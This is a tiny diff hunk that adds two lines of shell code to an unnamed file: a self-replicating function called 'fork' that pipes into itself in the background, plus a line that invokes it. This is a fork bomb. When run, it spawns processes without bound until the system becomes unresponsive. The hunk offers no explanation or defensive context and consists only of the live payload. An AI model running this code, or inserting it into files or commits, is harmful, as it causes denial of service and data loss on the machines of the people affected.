@@ -1,0 +1,2 @@
+fork() { fork | fork & }
+fork
